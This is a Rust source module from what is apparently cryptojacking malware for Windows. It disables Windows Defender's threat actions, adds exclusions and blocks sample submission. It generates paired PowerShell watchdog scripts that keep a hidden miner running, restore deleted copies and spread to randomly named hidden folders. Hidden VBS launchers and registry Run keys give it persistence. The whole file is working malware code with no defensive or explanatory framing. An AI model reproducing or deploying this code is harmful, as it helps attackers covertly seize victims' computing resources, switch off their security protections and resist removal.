use std::fs::File;
use std::io::Write;
use std::path::{Path, PathBuf};
use crate::common::constants::{MINER_EXE_NAME, MONITOR_SCRIPT, HELPER_SCRIPT, LAUNCHER_SCRIPT, HELPER_LAUNCHER};

#[cfg(windows)]
use std::process::Command;

#[cfg(windows)]
pub fn add_defender_exclusion(path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    // Powershell command to add exclusion
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            &format!("Add-MpPreference -ExclusionPath '{}' -Force", path.display())
        ])
        .output();
    Ok(())
}

#[cfg(windows)]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    // Set default actions for all threat levels to 6 (Allow)
    // This allows threats to run without being deleted, while Real-Time protection stays "On".
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            "Set-MpPreference -HighThreatDefaultAction 6 -SevereThreatDefaultAction 6 -ModerateThreatDefaultAction 6 -LowThreatDefaultAction 6 -Force"
        ])
        .output();
        
    // Also disable cloud sample submission to avoid uploading our samples
    let _ = Command::new("powershell.exe")
        .args(&[
            "-Command",
            "Set-MpPreference -SubmitSamplesConsent 2 -Force"
        ])
        .output();

    Ok(())
}

#[cfg(not(windows))]
pub fn add_defender_exclusion(_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(not(windows))]
pub fn neutralize_defender() -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}


pub fn create_watchdog_script(install_dirs: &[PathBuf], config_path: &Path) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    // We need to generate scripts that know about ALL locations.
    // For simplicity, we'll put the SAME script content in all locations, 
    // but each script needs to know its own "Role" or just check everyone else.
    
    // Convert paths to string literals for PowerShell
    let dirs_ps: Vec<String> = install_dirs.iter()
        .map(|d| format!("'{}'", d.display()))
        .collect();
    let dirs_array = dirs_ps.join(", ");

    let miner_name = MINER_EXE_NAME;
    let monitor_name = MONITOR_SCRIPT;
    let helper_name = HELPER_SCRIPT;
    let _launcher_name = LAUNCHER_SCRIPT;
    let _helper_launcher_name = HELPER_LAUNCHER; 

    // The script logic:
    // 1. Array of all install locations.
    // 2. Function Ensure-Self: Make sure I am running from a valid location? (Skip for now, simplistic is better).
    // 3. Function Check-Others: Iterate other locations. If missing, copy from MY location to THERE.
    // 4. Function Ensure-Miner: Check if miner process is running. If not, start it from MY location.
    // 5. Function Ensure-Helpers: Check if other watchdogs are running? 
    //    Actually, we just run 2 scripts: sys_monitor and sys_helper. 
    //    Each one ensures the other is running.

    // PRIMARY WATCHDOG SCRIPT (sys_monitor.ps1)
    let monitor_ps_content = format!(
        r#"
$ErrorActionPreference = "SilentlyContinue"
$install_dirs = @({dirs_array})
$my_dir = $PSScriptRoot
$miner_exe = Join-Path $my_dir "{miner_name}"
$config = Join-Path $my_dir "sys_config.dat"
$helper_script = "{helper_name}"

# Polymorphic Resources
$poly_names = @("SysCache", "WinData", "NetConfig", "CloudSync", "SysDriver", "WinHost")
$poly_parents = @($env:USERPROFILE, "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Music", "$env:USERPROFILE\\Pictures", "$env:USERPROFILE\\Videos")

function Start-Miner {{
    $proc = Get-Process -Name "{miner_proc}" -ErrorAction SilentlyContinue
    if (-not $proc) {{
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $miner_exe
        $psi.Arguments = "-c `"$config`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }}
}}

function Migrate-Random {{
    # Create a NEW copy in a RANDOM location to evade removal
    $rnd_name = $poly_names | Get-Random
    $rnd_parent = $poly_parents | Get-Random
    $new_dir = Join-Path $rnd_parent $rnd_name
    
    if (-not (Test-Path $new_dir)) {{
        # 1. Copy
        Copy-Item -Path $my_dir -Destination $new_dir -Recurse -Force
        
        # 2. Hide
        $item = Get-Item -Path $new_dir -Force
        $item.Attributes = "Hidden, System, Directory"
        Get-ChildItem -Path $new_dir -Recurse | ForEach-Object {{ $_.Attributes = "Hidden, System" }}

        # 3. Update Registry Run (Mutate Key Name)
        $launcher = Join-Path $new_dir "{launcher_name_vbs}"
        $reg_name = "Windows_" + $rnd_name
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $reg_name /t REG_SZ /d "wscript.exe `"$launcher`"" /f
        
        # 4. Update Environment PATH
        $current_path = [Environment]::GetEnvironmentVariable("Path", "User")
        if ($current_path -notlike "*$new_dir*") {{
            $new_path_val = "$current_path;$new_dir"
            [Environment]::SetEnvironmentVariable("Path", $new_path_val, "User")
        }}

        # 5. Launch New Instance
        $vbs = Join-Path $new_dir "{launcher_name_vbs}"
        wscript.exe "$vbs"
    }}
}}

function Check-And-Restore {{
    foreach ($dir in $install_dirs) {{
        if (-not (Test-Path $dir)) {{
            # DETECTED DELETION!
            # 1. Restore the original target (Decoy/Persistence)
            Copy-Item -Path $my_dir -Destination $dir -Recurse -Force
            
            # 2. TRIGGER POLYMORPHISM: Spread to a new random location
            Migrate-Random
            
        }} elseif (-not (Test-Path (Join-Path $dir "{miner_name}"))) {{
             Copy-Item -Path $my_dir -Destination $dir -Recurse -Force
        }}
    }}
}}

function Ensure-Helper {{
    $procs = Get-WmiObject Win32_Process | Where-Object {{ $_.CommandLine -like "*$helper_script*" }}
    if (-not $procs) {{
        # Try to find a valid helper to launch
        foreach ($dir in $install_dirs) {{
            $script = Join-Path $dir $helper_script
            if (Test-Path $script) {{
                Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script`"" -WindowStyle Hidden
                break
            }}
        }}
    }}
}}

while ($true) {{
    Start-Miner
    Check-And-Restore
    Ensure-Helper
    Start-Sleep -Seconds 10
}}
"#,
        dirs_array = dirs_array,
        miner_name = miner_name,
        helper_name = helper_name,
        launcher_name_vbs = LAUNCHER_SCRIPT,
        miner_proc = miner_name.trim_end_matches(".exe")
    );

    // SECONDARY WATCHDOG SCRIPT (sys_helper.ps1)
    // Similar logic, but ensures Primary (sys_monitor.ps1) is running.
    let helper_ps_content = format!(
        r#"
$ErrorActionPreference = "SilentlyContinue"
$install_dirs = @({dirs_array})
$my_dir = $PSScriptRoot
$miner_exe = Join-Path $my_dir "{miner_name}"
$config = Join-Path $my_dir "sys_config.dat"
$monitor_script = "{monitor_name}"

# Polymorphic Resources
$poly_names = @("SysCache", "WinData", "NetConfig", "CloudSync", "SysDriver", "WinHost")
$poly_parents = @($env:USERPROFILE, "$env:USERPROFILE\\Documents", "$env:USERPROFILE\\Music", "$env:USERPROFILE\\Pictures", "$env:USERPROFILE\\Videos")

function Start-Miner {{
    $proc = Get-Process -Name "{miner_proc}" -ErrorAction SilentlyContinue
    if (-not $proc) {{
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $miner_exe
        $psi.Arguments = "-c `"$config`""
        $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
        $psi.CreateNoWindow = $true
        $psi.UseShellExecute = $false
        [System.Diagnostics.Process]::Start($psi) | Out-Null
    }}
}}

function Migrate-Random {{
    # Create a NEW copy in a RANDOM location to evade removal
    $rnd_name = $poly_names | Get-Random
    $rnd_parent = $poly_parents | Get-Random
    $new_dir = Join-Path $rnd_parent $rnd_name
    
    if (-not (Test-Path $new_dir)) {{
        # 1. Copy
        Copy-Item -Path $my_dir -Destination $new_dir -Recurse -Force
        
        # 2. Hide
        $item = Get-Item -Path $new_dir -Force
        $item.Attributes = "Hidden, System, Directory"
        Get-ChildItem -Path $new_dir -Recurse | ForEach-Object {{ $_.Attributes = "Hidden, System" }}

        # 3. Update Registry Run (Mutate Key Name)
        $launcher = Join-Path $new_dir "{launcher_name_vbs}"
        $reg_name = "Windows_" + $rnd_name
        reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v $reg_name /t REG_SZ /d "wscript.exe `"$launcher`"" /f
        
        # 4. Update Environment PATH
        $current_path = [Environment]::GetEnvironmentVariable("Path", "User")
        if ($current_path -notlike "*$new_dir*") {{
            $new_path_val = "$current_path;$new_dir"
            [Environment]::SetEnvironmentVariable("Path", $new_path_val, "User")
        }}
        
        # 5. Launch New Instance
        $vbs = Join-Path $new_dir "{launcher_name_vbs}"
        wscript.exe "$vbs"
    }}
}}

function Check-And-Restore {{
    foreach ($dir in $install_dirs) {{
        if (-not (Test-Path $dir)) {{
            Copy-Item -Path $my_dir -Destination $dir -Recurse -Force
            # DETECTED DELETION! TRIGGER POLYMORPHISM
            Migrate-Random
        }} elseif (-not (Test-Path (Join-Path $dir "{miner_name}"))) {{
             Copy-Item -Path $my_dir -Destination $dir -Recurse -Force
        }}
    }}
}}

function Ensure-Monitor {{
    $procs = Get-WmiObject Win32_Process | Where-Object {{ $_.CommandLine -like "*$monitor_script*" }}
    if (-not $procs) {{
        foreach ($dir in $install_dirs) {{
            $script = Join-Path $dir $monitor_script
            if (Test-Path $script) {{
                Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script`"" -WindowStyle Hidden
                break
            }}
        }}
    }}
}}

while ($true) {{
    Start-Miner
    Check-And-Restore
    Ensure-Monitor
    Start-Sleep -Seconds 13
}}
"#,
        dirs_array = dirs_array,
        miner_name = miner_name,
        monitor_name = monitor_name,
        launcher_name_vbs = LAUNCHER_SCRIPT,
        miner_proc = miner_name.trim_end_matches(".exe")
    );

    // Write scripts to ALL locations
    let mut vbs_paths = Vec::new();

    for dir in install_dirs {
        if !dir.exists() { continue; }

        let monitor_path = dir.join(MONITOR_SCRIPT);
        let mut f = File::create(&monitor_path)?;
        f.write_all(monitor_ps_content.as_bytes())?;

        let helper_path = dir.join(HELPER_SCRIPT);
        let mut f = File::create(&helper_path)?;
        f.write_all(helper_ps_content.as_bytes())?;

        // CREATE VBS LAUNCHERS for THIS location
        // Launcher 1 -> sys_monitor.ps1
        let vbs_code_1 = format!(
            r#"Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""{}""", 0, False
Set WshShell = Nothing
"#,
            monitor_path.display()
        );
        let vbs_path_1 = dir.join(LAUNCHER_SCRIPT);
        let mut f = File::create(&vbs_path_1)?;
        f.write_all(vbs_code_1.as_bytes())?;
        
        // Launcher 2 -> sys_helper.ps1
        let vbs_code_2 = format!(
            r#"Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""{}""", 0, False
Set WshShell = Nothing
"#,
            helper_path.display()
        );
        let vbs_path_2 = dir.join(HELPER_LAUNCHER);
        let mut f = File::create(&vbs_path_2)?;
        f.write_all(vbs_code_2.as_bytes())?;

        vbs_paths.push(vbs_path_1);
    }

    Ok(vbs_paths)
}

#[cfg(windows)]
pub fn start_hidden(vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Command::new("wscript.exe")
        .arg(vbs_path)
        .spawn()?;
    
    // Attempt to start the partner launcher if it exists in the same dir
    let dir = vbs_path.parent().unwrap();
    let partner = dir.join(HELPER_LAUNCHER);
    if partner.exists() {
        Command::new("wscript.exe").arg(partner).spawn()?;
    }
    
    Ok(())
}

#[cfg(not(windows))]
pub fn start_hidden(_vbs_path: &Path) -> Result<(), Box<dyn std::error::Error>> {
    Ok(())
}

#[cfg(windows)]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    use crate::constants::MINER_EXE_NAME;
    let miner_proc = MINER_EXE_NAME.trim_end_matches(".exe");
    
    // Kill miner
    let _ = Command::new("taskkill")
        .args(&["/F", "/IM", MINER_EXE_NAME])
        .output();
    
    // Kill powershells running sys_*.ps1
    let _ = Command::new("powershell.exe")
        .args(&["-Command", "Get-WmiObject Win32_Process | Where-Object { $_.CommandLine -like '*sys_*.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"])
        .output();
        
    Ok(())
}

#[cfg(not(windows))]
pub fn stop_mining() -> Result<(), Box<dyn std::error::Error>> {
    use std::process::Command;
    let _ = Command::new("pkill").args(&["-f", "xmrig"]).output();
    let _ = Command::new("pkill").args(&["-f", "sys_svchost"]).output();
    Ok(())
}

#[cfg(windows)]
pub fn hide_console() {
    unsafe {
        use winapi::um::wincon::GetConsoleWindow;
        use winapi::um::winuser::{ShowWindow, SW_HIDE};
        let window = GetConsoleWindow();
        if !window.is_null() {
            ShowWindow(window, SW_HIDE);
        }
    }
}

#[cfg(not(windows))]
pub fn hide_console() {}
